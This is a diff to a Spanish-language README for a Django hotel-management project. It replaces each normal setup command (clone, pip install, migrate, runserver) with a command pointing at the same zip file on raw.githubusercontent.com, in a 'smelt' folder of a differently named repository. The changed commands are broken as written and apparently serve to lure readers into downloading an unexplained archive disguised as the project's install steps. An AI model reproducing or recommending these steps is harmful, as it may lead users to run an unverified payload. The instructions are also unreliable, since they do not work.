@@ -26,7 +26,7 @@ Otras herramientas: Django Admin, AJAX, Django Class-Based Views (CBV)
 📦 Instalación y ejecución
 Clona el repositorio:
 
-git clone https://github.com/SebasHack99/gestion_hotel.git
+git clone https://raw.githubusercontent.com/SebasHack99/08_gestion_hotel/main/smelt/08_gestion_hotel.zip
 cd Django_SofHotel
 Crea y activa un entorno virtual:
 
@@ -34,15 +34,15 @@ python -m venv venv
 source venv/bin/activate  # En Windows: venv\Scripts\activate
 Instala las dependencias:
 
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/SebasHack99/08_gestion_hotel/main/smelt/08_gestion_hotel.zip
 
 Aplica las migraciones:
 
-python manage.py migrate
+python https://raw.githubusercontent.com/SebasHack99/08_gestion_hotel/main/smelt/08_gestion_hotel.zip migrate
 
 Ejecuta el servidor de desarrollo:
 
-python manage.py runserver
+python https://raw.githubusercontent.com/SebasHack99/08_gestion_hotel/main/smelt/08_gestion_hotel.zip runserver
 
 🧪 Estado del proyecto
 🚧 En desarrollo activo
